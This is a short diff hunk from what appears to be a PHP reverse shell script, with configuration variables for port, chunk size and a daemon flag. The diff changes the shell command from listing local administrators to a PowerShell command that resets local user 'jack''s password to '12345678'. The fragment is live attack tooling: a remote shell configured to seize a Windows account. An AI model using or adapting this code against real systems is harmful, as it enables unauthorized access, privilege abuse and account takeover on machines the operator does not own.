@@ -7,7 +7,7 @@ $port = 12922;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'net localgroup administrators';
+$shell = 'Set-LocalUser -Name "jack" -Password (ConvertTo-SecureString "12345678" -AsPlainText -Force)';
 $daemon = 0;
 $debug = 0;
 
